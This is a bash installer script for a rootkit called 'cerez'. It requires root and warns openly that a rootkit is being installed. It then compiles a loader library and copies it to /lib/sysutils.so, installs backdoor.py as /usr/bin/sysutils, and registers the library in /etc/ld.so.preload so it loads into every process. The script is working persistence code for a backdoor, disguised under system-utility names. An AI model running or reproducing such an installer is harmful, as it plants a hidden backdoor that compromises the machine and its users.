RED="\e[0;31m"
GREEN="\e[1;32m"
RESET="\e[0m"

if [ $(id -u) -ne 0 ]; then
	printf "$RED"	
	printf "Run as root$RESET\n"	
	exit 
fi

printf "$RED"
cat << EOF
 ▄████▄  ▓█████  ██▀███  ▓█████ ▒███████▒
▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒▓█   ▀ ▒ ▒ ▒ ▄▀░
▒▓█    ▄ ▒███   ▓██ ░▄█ ▒▒███   ░ ▒ ▄▀▒░ 
▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄  ▒▓█  ▄   ▄▀▒   ░
▒ ▓███▀ ░░▒████▒░██▓ ▒██▒░▒████▒▒███████▒
░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░░▒▒ ▓░▒░▒
  ░  ▒    ░ ░  ░  ░▒ ░ ▒░ ░ ░  ░░░▒ ▒ ░ ▒
░           ░     ░░   ░    ░   ░ ░ ░ ░ ░
░ ░         ░  ░   ░        ░  ░  ░ ░    
			
        cerez installer script
        github.com/ngn13/cerez 
EOF
cat << EOF

This install script will install cerez
on this machine, this is not the client
you are about to install a ROOTKIT on
this machine!
 
You have 10 seconds to cancel (ctrl+c)
EOF
printf "$RESET"
sleep 10
printf "$RED"
printf "Installing cerez...\n"
printf "$RESET"
gcc -shared -fPIC loader.c -o loader.so -ldl -nostartfiles
cp loader.so /lib/sysutils.so
chmod +x backdoor.py
cp backdoor.py /usr/bin/sysutils
echo /lib/sysutils.so > /etc/ld.so.preload
printf "$GREEN"
printf "Cerez has been installed, happy hacking!\n"
printf "$RESET"
